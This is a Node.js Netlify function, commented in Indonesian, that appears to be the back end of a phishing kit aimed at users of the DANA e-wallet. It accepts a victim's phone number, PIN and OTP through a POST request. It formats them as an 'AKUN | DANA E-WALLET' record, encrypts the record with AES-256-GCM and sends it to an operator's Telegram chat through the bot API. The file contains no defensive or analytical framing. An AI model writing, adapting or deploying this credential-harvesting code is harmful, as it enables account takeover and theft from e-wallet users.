const axios = require('axios');
const crypto = require('crypto');

// Fungsi untuk enkripsi data
function encrypt(text, key) {
  try {
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv('aes-256-gcm', Buffer.from(key, 'hex'), iv);
    
    let encrypted = cipher.update(text, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    
    const tag = cipher.getAuthTag();
    return iv.toString('hex') + ':' + encrypted + ':' + tag.toString('hex');
  } catch (error) {
    throw new Error('Gagal mengenkripsi data: ' + error.message);
  }
}

// Format pesan untuk Telegram
function formatMessage(type, phone, pin, otp) {
  const cleanPhone = phone.replace(/\D/g, '');
  
  let message = 
    "├• AKUN | DANA E-WALLET\n" +
    "├───────────────────\n" +
    `├• NO HP : ${cleanPhone}\n`;

  if (pin) {
    message += "├───────────────────\n" +
               `├• PIN  : ${pin}\n`;
  }

  if (otp) {
    message += "├───────────────────\n" +
               `├• OTP : ${otp}\n`;
  }

  message += "╰───────────────────";
  return message;
}

// Fungsi utama Netlify
exports.handler = async (event, context) => {
  // Hanya terima POST requests
  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      body: JSON.stringify({ error: 'Method Not Allowed' }),
      headers: { 'Content-Type': 'application/json' }
    };
  }

  try {
    // Parse dan validasi request
    const { type, phone, pin, otp } = JSON.parse(event.body);
    
    if (!type || !phone) {
      return {
        statusCode: 400,
        body: JSON.stringify({ error: 'Type dan phone diperlukan' }),
        headers: { 'Content-Type': 'application/json' }
      };
    }

    // Bersihkan nomor telepon
    const cleanPhone = phone.replace(/\D/g, '');
    
    if (cleanPhone.length < 10) {
      return {
        statusCode: 400,
        body: JSON.stringify({ error: 'Nomor telepon harus minimal 10 digit' }),
        headers: { 'Content-Type': 'application/json' }
      };
    }

    // Ambil konfigurasi dari environment variables
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    const encryptionKey = process.env.ENCRYPTION_KEY;

    // Validasi konfigurasi
    if (!botToken || !chatId) {
      return {
        statusCode: 500,
        body: JSON.stringify({ error: 'Konfigurasi Telegram tidak lengkap' }),
        headers: { 'Content-Type': 'application/json' }
      };
    }

    if (!encryptionKey) {
      return {
        statusCode: 500,
        body: JSON.stringify({ error: 'Kunci enkripsi tidak dikonfigurasi' }),
        headers: { 'Content-Type': 'application/json' }
      };
    }

    // Format dan enkripsi pesan
    const originalMessage = formatMessage(type, cleanPhone, pin, otp);
    const encryptedMessage = encrypt(originalMessage, encryptionKey);
    
    // Kirim pesan terenkripsi ke Telegram
    await axios.post(
      `https://api.telegram.org/bot${botToken}/sendMessage`,
      {
        chat_id: chatId,
        text: `🔐 DATA TERENKRIPSI:\n${encryptedMessage}\n\nGunakan kunci AES-256-GCM untuk mendekripsi.`,
        parse_mode: 'HTML'
      },
      {
        timeout: 5000
      }
    );

    return {
      statusCode: 200,
      body: JSON.stringify({ 
        success: true,
        message: 'Data terenkripsi berhasil dikirim'
      }),
      headers: { 'Content-Type': 'application/json' }
    };

  } catch (error) {
    console.error('Error:', error);
    
    return {
      statusCode: 500,
      body: JSON.stringify({
        error: 'Terjadi kesalahan internal',
        details: error.message
      }),
      headers: { 'Content-Type': 'application/json' }
    };
  }
};
